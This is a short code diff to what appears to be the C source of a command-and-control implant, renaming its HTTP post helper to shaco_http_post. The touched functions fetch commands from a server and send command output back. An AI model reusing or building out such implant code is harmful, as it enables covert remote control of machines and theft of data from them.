@@ -23,7 +23,7 @@ bool send_knife(PPACKER poison, uint32_t cmdid){
     packer_add_data(packer,packer_get_buffer(poison),packer_get_size(poison));
 
     MSG("Sending response, size: %lu", packer_get_size(packer));
-    resp = http_post(packer_get_buffer(packer), packer_get_size(packer));
+    resp = shaco_http_post(packer_get_buffer(packer), packer_get_size(packer));
     if(!resp) MSG("can't send output");
     success = true;
 
@@ -46,7 +46,7 @@ bool boxboxbox(){
     packer_add_int32(packer, COMMAND_GET);
 
     MSG("Getting command from server");
-    http_response = http_post(packer_get_buffer(packer), packer_get_size(packer));
+    http_response = shaco_http_post(packer_get_buffer(packer), packer_get_size(packer));
     if(!http_response) { MSG("Error in sending post"); goto EXIT; }
     else if(http_response->status == 404) {MSG("404 not found");goto EXIT;}
 
